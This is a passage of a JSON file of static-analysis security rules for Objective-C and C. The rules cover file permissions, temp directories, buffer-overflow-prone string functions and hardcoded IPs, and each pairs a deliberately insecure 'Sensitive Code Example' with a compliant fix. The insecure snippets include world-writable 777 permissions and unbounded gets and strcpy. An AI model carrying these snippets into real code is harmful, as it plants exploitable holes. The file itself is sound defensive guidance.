0, strlen(localToken));\n  free(password);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> C++ reference - <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset</code>, <code>memset_s</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data\">Application Security\n  Verification Standard 4.0 - 8.3.6</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/14\">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "objc:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>When creating a file or directory with permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory\n</pre>\n<p>When explicitly adding permissions to \"other group\" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>\nfunctions:</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file\n\nfchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor\n</pre>\n<p>When defining the <code>umask</code> without read, write and execute permissions for \"other group\":</p>\n<pre>\numask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to \"other group\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>When creating a file or directory, do not set permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG); // Compliant\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to \"other group\":</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG);  // Compliant\n\nfchmod(fd, S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>\n<pre>\numask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for \"other group\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;cstdio&gt;\n// ...\n\nvoid f() {\n  FILE * fp = fopen(\"/tmp/temporary_file\", \"r\"); // Sensitive\n}\n</pre>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n#include &lt;sstream&gt;\n// ...\n\nvoid f() {\n  std::stringstream ss;\n  ss &lt;&lt; getenv(\"TMPDIR\") &lt;&lt; \"/temporary_file\"; // Sensitive\n  FILE * fp = fopen(ss.str().c_str(), \"w\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n// ...\n\nvoid f() {\n  FILE * fp = tmpfile(); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S1081": {
        "name": "Insecure functions should not be used",
        "htmlDesc": "<p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not\nproperly check or limit the size of the data they are handling.</p>\n<h2>Why is this an issue?</h2>\n<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the\nprogram reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>\n<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as\na buffer overflow vulnerability.</p>\n<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid\nbuffer overflows.</p>\n<h3>What is the potential impact?</h3>\n<h4>Code execution</h4>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h2>How to fix it</h2>\n<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets_s(str, sizeof(str));\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy_s(buffer, sizeof buffer, input);\n</pre>\n<h3>How does this work?</h3>\n<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are\nknown to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use\n<code>gets_s</code>.</p>\n<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing\nwith strings).</p>\n<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;stdio.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a\nhref=\"https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya\">StringCbCopyA</a> (Windows) or <a\nhref=\"https://www.freebsd.org/cgi/man.cgi?query=strlcpy\">strlcpy</a> (FreeBSD).</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5813": {
        "name": "Using \"strlen\" or \"wcslen\" is security-sensitive",
        "htmlDesc": "<p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>\nThe function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null\npointer.</p>\n<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string \"abcde\" must be stored in memory as \"abcde\\0\" (i.e.\nusing 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of\nthe buffer, which is undefined behavior.</p>\n<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities\nthat allow, for example, access to sensitive data or the execution of arbitrary code.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that the pointer is null. </li>\n  <li> There is a possibility that the string is not correctly null-terminated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>\n  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  return strlen(dest); // Sensitive: \"dest\" will not be null-terminated if truncation happened\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  dest[sizeof dest - 1] = 0;\n  return strlen(dest); // Compliant: \"dest\" is guaranteed to be null-terminated\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5814": {
        "name": "Using \"strcat\" or \"wcscat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the\nend of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and\n<code>wcscaty</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=objc%3AS5815'>S5815</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to\n  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strcat(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0\n  strcpy(dest, result);\n  strcat(dest, src); // Compliant: the buffer size was carefully crafted\n  int r = doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5815": {
        "name": "Using \"strncat\" or \"wcsncat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string\n<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be\n<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to\n  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should\n  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> The <code>count</code> parameter is error-prone </li>\n      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other\n      simpler alternatives exist </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char dest[256];\n  strcpy(dest, result);\n  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5816": {
        "name": "Using \"strncpy\" or \"wcsncpy\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>\ncharacters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The\n<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>\n  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>\n  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>\n  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>\n  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>\n  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should\n  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>\n      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>\n    </ul>  </li>\n  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:\n    <ul>\n      <li> Set the last character of the buffer to <code>null</code> </li>\n      <li> Call the function </li>\n      <li> Check if the last character of the buffer is still <code>null</code> </li>\n    </ul>  </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  dest[sizeof dest - 1] = 0;\n  strncpy(dest, src, sizeof(dest)); // Compliant\n  if (dest[sizeof dest - 1] != 0) {\n    // Handle error\n  }\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = \"10.10.0.1\"; // Sensitive\ndbi_conn_set_option(conn, \"host\", host.c_str());\ndbi_conn_set_option(conn, \"host\", \"10.10.0.1\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = getDatabaseHost(); // Compliant\ndbi_conn_set_option(conn, \"host\", host.c_str()); // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "objc:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
